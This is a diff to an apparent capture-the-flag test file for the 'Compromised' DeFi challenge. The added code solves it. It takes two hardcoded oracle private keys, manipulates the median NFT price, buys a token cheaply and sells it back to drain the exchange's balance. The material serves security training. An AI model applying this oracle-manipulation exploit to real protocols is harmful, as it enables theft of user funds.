@@ -61,6 +61,71 @@ describe('Compromised challenge', function () {
 
     it('Exploit', async function () {        
         /** CODE YOUR EXPLOIT HERE */
+        const key1 = "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9";
+        const key2 = '0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48';
+
+        const oracle1 = new ethers.Wallet(key1, ethers.provider);
+        const oracle2 = new ethers.Wallet(key2, ethers.provider);
+
+        console.log(oracle1.address);
+        console.log(oracle2.address);
+
+        const orc1Trust = this.oracle.connect(oracle1);
+        const orc2Trust = this.oracle.connect(oracle2);
+
+        let priceToSet = ethers.utils.parseEther("0.01");
+
+        const setMedianPrice = async (amount) => {
+            let currMedianPrice = await this.oracle.getMedianPrice("DVNFT");
+            console.log("Current median price is", currMedianPrice.toString());
+
+            console.log("Posting to oracle 1");
+            await orc1Trust.postPrice("DVNFT", amount)
+            
+            currMedianPrice = await this.oracle.getMedianPrice("DVNFT");
+            console.log("Current median price is", currMedianPrice.toString());
+
+            console.log("Posting to oracle 2");
+            await orc2Trust.postPrice("DVNFT", amount)
+
+            currMedianPrice = await this.oracle.getMedianPrice("DVNFT");
+            console.log("Current median price is", currMedianPrice.toString());
+        }
+
+        await setMedianPrice(priceToSet);
+
+        const attackExchange = this.exchange.connect(attacker);
+        await attackExchange.buyOne({
+            value: priceToSet
+        })
+
+        const attackNFT = this.nftToken.connect(attacker);
+
+        const tokenCount = await attackNFT.balanceOf(attacker.address);
+        const tokenId = 0;
+        const ownerId = await attackNFT.ownerOf(tokenId);
+
+        console.log("Acquired token id:", tokenId.toString());
+        console.log("Owner of token is", ownerId);
+
+        console.log("Setting price to balance of exchange");
+        const balOfExchange = await ethers.provider.getBalance(this.exchange.address);
+
+        priceToSet = balOfExchange
+
+        await setMedianPrice(priceToSet);
+
+        const prices = await this.oracle.getAllPricesForSymbol("DVNFT");
+
+        prices.forEach(price => console.log(price.toString()))
+
+        console.log("Selling NFT for the median price");
+        
+        await attackNFT.approve(attackExchange.address, tokenId);
+        await attackExchange.sellOne(tokenId);
+
+        priceToSet = INITIAL_NFT_PRICE;
+        await setMedianPrice(priceToSet);
     });
 
     after(async function () {
